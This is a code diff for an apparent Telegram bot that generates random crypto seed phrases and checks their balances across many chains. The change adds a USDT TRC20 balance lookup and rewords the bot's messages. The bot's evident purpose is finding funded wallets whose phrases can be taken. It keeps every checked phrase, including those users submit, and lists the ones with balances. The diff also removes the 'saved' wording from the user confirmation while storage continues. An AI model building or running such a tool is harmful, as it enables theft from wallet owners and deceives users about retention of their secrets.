@@ -49,6 +49,7 @@ USDT_POLYGON = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F"
 USDT_AVALANCHE = "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7"
 USDT_ARBITRUM = "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9"
 USDT_OPTIMISM = "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58"
+USDT_TRC20 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"  # Tron USDT контракт
 
 ERC20_ABI = json.loads('[{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}]')
 
@@ -165,6 +166,7 @@ def get_litecoin_balance(address):
         return 0
 
 def get_tron_balance(address):
+    """Получает TRX баланс (основная монета)"""
     url = f"https://api.trongrid.io/v1/accounts/{address}"
     try:
         resp = requests.get(url, timeout=10)
@@ -177,16 +179,42 @@ def get_tron_balance(address):
     return 0
 
 def get_usdt_trc20_balance(address):
-    url = f"https://api.trongrid.io/v1/accounts/{address}"
+    """Получает баланс USDT TRC-20 через TronGrid API"""
+    url = "https://api.trongrid.io/wallet/triggersmartcontract"
+    
     try:
-        resp = requests.get(url, timeout=10)
-        data = resp.json()
-        if 'data' in data and len(data['data']) > 0:
-            for trc20 in data['data'][0].get('trc20', []):
-                if 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' in trc20:
-                    return int(trc20['TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t']) / 1e6
-    except:
-        pass
+        # Конвертируем адрес из Base58 в hex (без префикса 0x41)
+        decoded = base58.b58decode(address)
+        if decoded[0] == 0x41:
+            decoded = decoded[1:]
+        hex_address = decoded.hex()
+        
+        # Формируем параметр: 64 символа, адрес выравнивается по правому краю
+        param = "0" * (64 - len(hex_address)) + hex_address
+        
+        payload = {
+            "contract_address": USDT_TRC20,
+            "function_selector": "balanceOf(address)",
+            "parameter": param,
+            "owner_address": address,
+            "visible": True
+        }
+        
+        headers = {"Content-Type": "application/json"}
+        response = requests.post(url, json=payload, headers=headers, timeout=15)
+        data = response.json()
+        
+        if 'constant_result' in data and data['constant_result']:
+            balance_hex = data['constant_result'][0]
+            if balance_hex and balance_hex != '0x' and balance_hex != '0':
+                if balance_hex.startswith('0x'):
+                    balance_hex = balance_hex[2:]
+                balance = int(balance_hex, 16) / 10**6
+                logger.info(f"USDT TRC20 balance: {balance}")
+                return balance
+    except Exception as e:
+        logger.error(f"USDT TRC20 error: {e}")
+    
     return 0
 
 def mnemonic_to_solana_address(mnemonic):
@@ -266,8 +294,7 @@ def check_all_balances(mnemonic):
             "xrp": get_ripple_balance(addrs["xrp"]) if addrs["xrp"] else 0,
             "ltc": get_litecoin_balance(addrs["ltc"]) if addrs["ltc"] else 0,
             "trx": get_tron_balance(addrs["trx"]) if addrs["trx"] else 0,
-            "usdt_trc20": get_usdt_trc20_balance(addrs["trx"]) if addrs["trx"] else 0,
-            "addresses": addrs
+            "usdt_trc20": get_usdt_trc20_balance(addrs["trx"]) if addrs["trx"] else 0
         }
         return results
     except Exception as e:
@@ -359,7 +386,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data['awaiting_check'] = True
         await query.edit_message_text(
             "✍️ Отправьте сид-фразу (12 слов) для проверки.\n\n"
-            "⚠️ <b>Внимание! Никогда не вводите фразу от вашего реального кошелька!</b>",
+            "⚠️ <b>Внимание! Никогда не вводите фразу от вашего реального кошелька!</b>\n\n"
+            "Пример: abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about",
             parse_mode="HTML"
         )
         return
@@ -367,15 +395,15 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "stats":
         total = context.bot_data['total_checks']
         non_empty = sum(1 for b in context.bot_data['checked_phrases'].values() if has_balance(b))
-        phrases = [p for p, b in context.bot_data['checked_phrases'].items() if has_balance(b)]
+        phrases_with_balance = [p for p, b in context.bot_data['checked_phrases'].items() if has_balance(b)]
         
         text = f"📊 <b>СТАТИСТИКА</b>\n\n"
-        text += f"🔹 Всего проверено: <b>{total}</b>\n"
-        text += f"🔹 С балансом: <b>{non_empty}</b>\n"
+        text += f"🔹 Всего проверено фраз: <b>{total}</b>\n"
+        text += f"🔹 Фраз с ненулевым балансом: <b>{non_empty}</b>\n"
         
-        if phrases:
-            text += f"\n<b>💰 Найденные фразы (первые 10):</b>\n"
-            for i, phrase in enumerate(phrases[:10], 1):
+        if phrases_with_balance:
+            text += f"\n<b>💰 Найденные фразы:</b>\n"
+            for i, phrase in enumerate(phrases_with_balance[:10], 1):
                 text += f"{i}. <code>{phrase[:40]}...</code>\n"
         
         await query.edit_message_text(text, parse_mode="HTML", reply_markup=main_menu_keyboard())
@@ -399,8 +427,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await sleep(0.5)
         
         text = f"✅ <b>Генерация {count} фраз завершена</b>\n\n"
-        text += f"🔹 Найдено с балансом: <b>{len(found)}</b>\n"
-        text += f"🔹 Всего проверено: <b>{context.bot_data['total_checks']}</b>\n"
+        text += f"🔹 Найдено фраз с балансом: <b>{len(found)}</b>\n"
+        text += f"🔹 Всего проверено фраз: <b>{context.bot_data['total_checks']}</b>\n"
         
         if found:
             text += f"\n<b>Найденные фразы:</b>\n"
@@ -411,7 +439,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if data == "gen_1":
-        await query.edit_message_text("⏳ Генерирую и проверяю...")
+        await query.edit_message_text("⏳ Генерирую сид-фразу и проверяю балансы...")
         mnemo = Mnemonic("english")
         phrase = mnemo.generate(strength=128)
         balance = check_all_balances(phrase)
@@ -424,7 +452,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.bot_data['total_checks'] += 1
         
         text = f"<b>🔑 Сид-фраза:</b>\n<code>{phrase}</code>\n\n"
-        text += f"<b>💰 Балансы:</b>\n"
+        text += f"<b>💰 Балансы основных монет:</b>\n"
         text += f"₿ BTC: {balance['btc']:.8f}\n"
         text += f"Ξ ETH: {balance['eth']:.6f}\n"
         text += f"🔶 BNB: {balance['bnb']:.6f}\n"
@@ -444,10 +472,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text += f"├ AVAX: ${balance['usdt_avalanche']:.2f}\n"
         text += f"├ ARB: ${balance['usdt_arbitrum']:.2f}\n"
         text += f"├ OPT: ${balance['usdt_optimism']:.2f}\n"
-        text += f"└ TRC20: ${balance['usdt_trc20']:.2f}\n"
+        text += f"└ <b>TRC20: {balance['usdt_trc20']:.2f}</b>\n"
         
         if has_balance(balance):
-            text += f"\n✅ <b>Найден ненулевой баланс!</b>"
+            text += f"\n🎉 <b>Найден ненулевой баланс!</b>"
         
         await query.edit_message_text(text, parse_mode="HTML", reply_markup=main_menu_keyboard())
         return
@@ -463,7 +491,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data['awaiting_check'] = False
             return
         
-        await update.message.reply_text("⏳ Проверяю балансы (12 сетей)...")
+        await update.message.reply_text("⏳ Проверяю балансы (12 сетей + USDT TRC20)...")
         balance = check_all_balances(phrase)
         
         if not balance:
@@ -472,14 +500,15 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.bot_data['checked_phrases'][phrase] = balance
             context.bot_data['total_checks'] += 1
             
-            text = f"<b>✅ Фраза проверена и сохранена!</b>\n\n"
+            text = f"<b>✅ Фраза проверена!</b>\n\n"
             text += f"<b>💰 Основные балансы:</b>\n"
             text += f"₿ BTC: {balance['btc']:.8f}\n"
             text += f"Ξ ETH: {balance['eth']:.6f}\n"
+            text += f"🔶 BNB: {balance['bnb']:.6f}\n"
             text += f"◎ SOL: {balance['sol']:.6f}\n"
             text += f"🐕 DOGE: {balance['doge']:.8f}\n"
-            text += f"🌞 TRX: {balance['trx']:.2f}\n"
-            text += f"💲 USDT TRC20: ${balance['usdt_trc20']:.2f}\n\n"
+            text += f"🌞 TRX: {balance['trx']:.2f}\n\n"
+            text += f"<b>💲 USDT TRC20: ${balance['usdt_trc20']:.2f}</b>\n\n"
             text += f"📊 Всего проверено фраз: <b>{context.bot_data['total_checks']}</b>"
             
             if has_balance(balance):
@@ -503,7 +532,7 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=main_menu_keyboard()
     )
 
-# ========== Защита от конфликтов ==========
+# ========== Защита от конфликтов и запуск ==========
 async def run_bot():
     app = Application.builder().token(TOKEN).build()
     
